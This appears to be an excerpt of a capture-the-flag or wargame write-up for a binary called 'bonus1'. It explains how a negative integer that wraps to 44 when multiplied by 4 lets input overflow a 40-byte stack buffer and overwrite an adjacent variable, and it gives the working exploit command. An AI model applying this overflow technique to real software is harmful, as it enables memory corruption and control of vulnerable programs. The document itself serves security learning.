We need to overflow the value of the variable `[esp+0x3c]` to set it at `0x574f4c46`. It's stored just after our buffer of 40 bytes. Now we have to figure how to pass an int which is less than `9` and once multiply by 4 is greater or equal to `44`: `-2147483637 * 4 = 44`.
```shell
./bonus1 "-2147483637" $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
```
